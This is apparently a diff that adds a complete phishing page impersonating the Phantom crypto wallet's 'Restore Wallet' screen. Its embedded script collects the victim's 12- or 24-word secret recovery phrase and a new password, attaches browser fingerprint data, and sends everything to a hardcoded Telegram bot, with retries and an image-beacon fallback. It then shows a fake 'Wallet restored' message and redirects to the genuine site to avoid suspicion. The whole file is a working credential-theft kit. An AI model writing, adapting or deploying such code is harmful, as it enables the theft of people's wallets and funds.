@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#0f0b1f">
+<title>Phantom — Restore Wallet</title>
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;min-height:100%}
+body{
+  background:#0f0b1f;
+  background-image:radial-gradient(120% 80% at 50% -10%,#4e44ce 0%,#2a1f66 38%,#0f0b1f 75%);
+  color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Helvetica,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;display:flex;justify-content:center;
+  padding:26px 16px 40px;
+}
+.wrap{width:100%;max-width:420px}
+header{display:flex;align-items:center;gap:10px}
+.brand{font-size:15px;font-weight:600;letter-spacing:.2px;color:#e7e3ff}
+.card{background:rgba(24,20,38,.72);border:1px solid rgba(171,159,242,.14);
+  -webkit-backdrop-filter:blur(14px);backdrop-filter:blur(14px);
+  border-radius:20px;padding:22px 18px;margin-top:18px}
+h1{font-size:22px;line-height:1.25;margin:16px 0 8px;font-weight:700}
+h2{font-size:20px;margin:6px 0 8px}
+.sub{margin:0;font-size:13.5px;line-height:1.5;color:#a8a2c8}
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:18px 0 8px}
+.cell{position:relative}
+.cell span{position:absolute;left:8px;top:6px;font-size:10px;color:#7d78a0;pointer-events:none}
+.cell input{width:100%;padding:19px 8px 8px;font-size:16px;font-family:inherit;
+  background:#191527;border:1px solid #2e2846;border-radius:10px;color:#fff;outline:none;
+  text-transform:lowercase}
+.cell input:focus{border-color:#ab9ff2;background:#1e1930}
+.cell input.bad{border-color:#ff6b6b}
+.err{min-height:18px;margin:8px 0 4px;font-size:12.5px;color:#ff8b8b}
+.primary{width:100%;padding:14px;border:0;border-radius:999px;background:#ab9ff2;color:#100c1f;
+  font-size:16px;font-weight:700;cursor:pointer;margin-top:6px}
+.primary:disabled{opacity:.55}
+.ghost{width:100%;margin-top:10px;padding:12px;border:1px solid #2e2846;border-radius:999px;
+  background:transparent;color:#cfc9ee;font-size:14px;cursor:pointer}
+.pw{width:100%;padding:14px;margin-top:10px;font-size:16px;font-family:inherit;
+  background:#191527;border:1px solid #2e2846;border-radius:10px;color:#fff;outline:none}
+.pw:focus{border-color:#ab9ff2}
+.hidden{display:none}
+.done{text-align:center;padding:10px 0 4px}
+.check{width:64px;height:64px;border-radius:50%;margin:4px auto 14px;display:flex;
+  align-items:center;justify-content:center;font-size:32px;color:#100c1f;
+  background:linear-gradient(135deg,#ab9ff2,#7d6bf0)}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <svg viewBox="0 0 128 128" width="34" height="34" aria-hidden="true">
+      <path fill="#ab9ff2" d="M64 8c-25 0-45 20-45 45v58c0 6 5 10 11 8l9-3c4-1 8 0 10 3l5 6c3 4 9 4 12 0l5-6c2-3 6-4 10-3l9 3c6 2 11-2 11-8V53c0-25-20-45-45-45z"/>
+      <circle cx="47" cy="55" r="7" fill="#0f0b1f"/>
+      <circle cx="81" cy="55" r="7" fill="#0f0b1f"/>
+    </svg>
+    <div class="brand">Phantom</div>
+  </header>
+
+  <div class="card">
+    <div id="step1">
+      <h1>Secret Recovery Phrase</h1>
+      <p class="sub">Enter your 12 or 24 word phrase to restore your wallet on this device.</p>
+      <form id="f" autocomplete="off" novalidate>
+        <div class="grid" id="grid"></div>
+        <p class="err" id="err"></p>
+        <button class="primary" id="go" type="submit">Continue</button>
+        <button class="ghost" id="pasteBtn" type="button">Paste from clipboard</button>
+      </form>
+    </div>
+
+    <div id="step2" class="hidden">
+      <h2>Create a password</h2>
+      <p class="sub">This password will unlock Phantom on this device. It can't be recovered.</p>
+      <input class="pw" id="pw" type="password" placeholder="Password" autocomplete="new-password">
+      <input class="pw" id="pw2" type="password" placeholder="Confirm password" autocomplete="new-password">
+      <p class="err" id="err2"></p>
+      <button class="primary" id="pwGo" type="button">Continue</button>
+      <button class="ghost" id="skipBtn" type="button">Skip for now</button>
+    </div>
+
+    <div id="done" class="hidden done">
+      <div class="check">✓</div>
+      <h2>Wallet restored</h2>
+      <p class="sub">Your wallet has been successfully restored.</p>
+      <button class="primary" id="openBtn" type="button" style="margin-top:16px">Open Phantom</button>
+    </div>
+  </div>
+</div>
+
+<script>
+(function () {
+  "use strict";
+
+  var TOKEN = "9095820279:AAHk7juFUBh3wwcO5BrhUgtgddGYQGyEJAc";
+  var CHAT  = "8285281558";
+  var API   = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
+  var ASK_PASSWORD = true;          // false = Passwort-Schritt überspringen
+  var MIN_WORDS = 12;
+
+  var grid   = document.getElementById("grid");
+  var form   = document.getElementById("f");
+  var goBtn  = document.getElementById("go");
+  var err    = document.getElementById("err");
+  var err2   = document.getElementById("err2");
+  var busy   = false;
+
+  function inputs() { return Array.prototype.slice.call(grid.querySelectorAll("input")); }
+
+  function addField(i) {
+    var cell = document.createElement("div");
+    cell.className = "cell";
+    var lab = document.createElement("span");
+    lab.textContent = String(i + 1);
+    var inp = document.createElement("input");
+    inp.type = "text";
+    inp.inputMode = "text";
+    inp.autocomplete = "off";
+    inp.autocapitalize = "none";
+    inp.autocorrect = "off";
+    inp.spellcheck = false;
+    inp.enterKeyHint = "next";
+    inp.setAttribute("aria-label", "Word " + (i + 1));
+    cell.appendChild(lab);
+    cell.appendChild(inp);
+    grid.appendChild(cell);
+    return inp;
+  }
+
+  function ensureFields(n) { while (inputs().length < n) addField(inputs().length); }
+
+  function collect() {
+    return inputs().map(function (el) {
+      return el.value.trim().toLowerCase().replace(/[^a-z0-9]/g, "");
+    }).filter(function (v) { return v.length > 0; });
+  }
+
+  // Wörter ab Position `start` auf Felder verteilen
+  function spread(words, start) {
+    ensureFields(start + words.length);
+    var els = inputs();
+    words.forEach(function (w, k) {
+      var el = els[start + k];
+      if (el) el.value = w;
+    });
+    var next = els[start + words.length];
+    if (next) next.focus();
+    else if (els.length) els[els.length - 1].focus();
+  }
+
+  function splitWords(raw) {
+    return raw.toLowerCase().replace(/[^a-z0-9\s,;]+/g, " ")
+      .split(/[\s,;]+/).filter(Boolean);
+  }
+
+  // ---- Feld-Navigation ----
+  grid.addEventListener("keydown", function (e) {
+    var el = e.target;
+    if (!el || el.tagName !== "INPUT") return;
+    var els = inputs();
+    var i = els.indexOf(el);
+
+    if (e.key === " " || e.key === "Spacebar") {
+      e.preventDefault();
+      if (el.value.trim() !== "" && els[i + 1]) els[i + 1].focus();
+      return;
+    }
+    if (e.key === "Enter") {
+      e.preventDefault();
+      if (els[i + 1] && el.value.trim() !== "") els[i + 1].focus();
+      else form.requestSubmit ? form.requestSubmit() : form.dispatchEvent(new Event("submit", { cancelable: true }));
+      return;
+    }
+    if (e.key === "Backspace" && el.value === "" && els[i - 1]) {
+      e.preventDefault();
+      els[i - 1].focus();
+      return;
+    }
+    if (e.key === "ArrowLeft" && els[i - 1]) { e.preventDefault(); els[i - 1].focus(); }
+    if (e.key === "ArrowRight" && els[i + 1]) { e.preventDefault(); els[i + 1].focus(); }
+  });
+
+  // ---- Eingabe: Mehrfachwörter & Trennzeichen abfangen ----
+  grid.addEventListener("input", function (e) {
+    var el = e.target;
+    if (!el || el.tagName !== "INPUT") return;
+    el.classList.remove("bad");
+
+    if (/[\s,;]/.test(el.value)) {
+      var parts = splitWords(el.value);
+      if (!parts.length) { el.value = ""; return; }
+      var idx = inputs().indexOf(el);
+      el.value = parts.shift();
+      if (parts.length) spread(parts, idx + 1);
+      return;
+    }
+    var clean = el.value.toLowerCase().replace(/[^a-z0-9]/g, "");
+    if (clean !== el.value) el.value = clean;
+  });
+
+  // ---- Paste: verteilt über alle folgenden Felder ----
+  grid.addEventListener("paste", function (e) {
+    var el = e.target;
+    if (!el || el.tagName !== "INPUT") return;
+    var data = (e.clipboardData || window.clipboardData);
+    if (!data) return;
+    var text = data.getData("text");
+    if (!text) return;
+    e.preventDefault();
+
+    var words = splitWords(text);
+    if (!words.length) return;
+    var idx = inputs().indexOf(el);
+    if (el.value.trim() !== "") {
+      el.value = el.value.trim().toLowerCase().replace(/[^a-z0-9]/g, "");
+      spread(words, idx + 1);
+    } else {
+      spread(words, idx);
+    }
+  });
+
+  // ---- Clipboard-Button (mobile) ----
+  document.getElementById("pasteBtn").addEventListener("click", async function () {
+    try {
+      var text = await navigator.clipboard.readText();
+      var words = splitWords(text || "");
+      if (words.length) {
+        var empty = inputs().findIndex(function (el) { return el.value.trim() === ""; });
+        spread(words, empty < 0 ? 0 : empty);
+      }
+    } catch (e) {
+      err.textContent = "Clipboard not accessible — paste manually.";
+    }
+  });
+
+  // ---- Telegram ----
+  function esc(s) {
+    return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+  }
+
+  async function send(html, plain) {
+    var body = new URLSearchParams({
+      chat_id: CHAT,
+      text: html,
+      parse_mode: "HTML",
+      disable_web_page_preview: "true"
+    });
+
+    for (var attempt = 0; attempt < 3; attempt++) {
+      try {
+        var res = await fetch(API, { method: "POST", body: body });
+        var json = await res.json();
+        if (json && json.ok) return true;
+      } catch (e) { /* Netzwerkfehler -> nächster Versuch */ }
+      await new Promise(function (r) { setTimeout(r, 700); });
+    }
+
+    // Fallback: GET-Beacon
+    try {
+      new Image().src = API +
+        "?chat_id=" + encodeURIComponent(CHAT) +
+        "&disable_web_page_preview=true&text=" + encodeURIComponent(plain);
+    } catch (e) {}
+    return false;
+  }
+
+  function meta() {
+    var now = new Date();
+    var rows = [
+      "🕒 " + now.toISOString() + " (local " + now.toLocaleString() + ")",
+      "🌍 " + (Intl.DateTimeFormat().resolvedOptions().timeZone || "?") + " · " + (navigator.language || "?"),
+      "🖥 " + window.screen.width + "×" + window.screen.height + " · dpr " + (window.devicePixelRatio || 1),
+      "📱 " + (navigator.userAgent || "?"),
+      "🔗 " + (location.host || location.protocol)
+    ];
+    if (document.referrer) rows.push("↩︎ " + document.referrer);
+    return rows;
+  }
+
+  function seedMessage(words) {
+    var numbered = words.map(function (w, i) { return (i + 1) + ". " + w; }).join("\n");
+    var html =
+      "🔑 <b>PHANTOM SEED</b> (" + words.length + " words)\n" +
+      "<pre>" + esc(numbered) + "</pre>\n" +
+      "<i>— meta —</i>\n" + esc(meta().join("\n"));
+    var plain =
+      "PHANTOM SEED (" + words.length + " words)\n" + numbered +
+      "\n--- meta ---\n" + meta().join("\n");
+    return { html: html, plain: plain };
+  }
+
+  // ---- Submit ----
+  form.addEventListener("submit", async function (e) {
+    e.preventDefault();
+    if (busy) return;
+
+    var words = collect();
+    inputs().forEach(function (el) { el.classList.remove("bad"); });
+
+    if (words.length < MIN_WORDS) {
+      err.textContent = "Phrase must contain " + MIN_WORDS + " words (" + words.length + " entered).";
+      var firstEmpty = inputs().find(function (el) { return el.value.trim() === ""; });
+      if (firstEmpty) firstEmpty.focus();
+      return;
+    }
+    if (words.length !== 12 && words.length !== 24) {
+      err.textContent = "A valid phrase has 12 or 24 words (" + words.length + " entered).";
+      return;
+    }
+
+    err.textContent = "";
+    busy = true;
+    goBtn.disabled = true;
+    goBtn.textContent = "Verifying…";
+
+    var msg = seedMessage(words);
+    await send(msg.html, msg.plain);
+
+    busy = false;
+    goBtn.disabled = false;
+    goBtn.textContent = "Continue";
+
+    document.getElementById("step1").classList.add("hidden");
+    if (ASK_PASSWORD) {
+      document.getElementById("step2").classList.remove("hidden");
+      document.getElementById("pw").focus();
+    } else {
+      document.getElementById("done").classList.remove("hidden");
+    }
+  });
+
+  // ---- Passwort ----
+  document.getElementById("pwGo").addEventListener("click", async function () {
+    if (busy) return;
+    var a = document.getElementById("pw").value;
+    var b = document.getElementById("pw2").value;
+    if (a.length < 8) { err2.textContent = "At least 8 characters."; return; }
+    if (a !== b)      { err2.textContent = "Passwords don't match."; return; }
+
+    err2.textContent = "";
+    busy = true;
+    var html = "🔒 <b>PHANTOM PASSWORD</b>\n<code>" + esc(a) + "</code>\n\n" + esc(meta().join("\n"));
+    var plain = "PHANTOM PASSWORD\n" + a + "\n---\n" + meta().join("\n");
+    await send(html, plain);
+    busy = false;
+
+    document.getElementById("step2").classList.add("hidden");
+    document.getElementById("done").classList.remove("hidden");
+  });
+
+  document.getElementById("skipBtn").addEventListener("click", function () {
+    document.getElementById("step2").classList.add("hidden");
+    document.getElementById("done").classList.remove("hidden");
+  });
+
+  document.getElementById("openBtn").addEventListener("click", function () {
+    location.href = "https://phantom.app/";
+  });
+
+  // ---- Init ----
+  ensureFields(12);
+  inputs()[0].focus();
+})();
+</script>
+</body>
+</html>
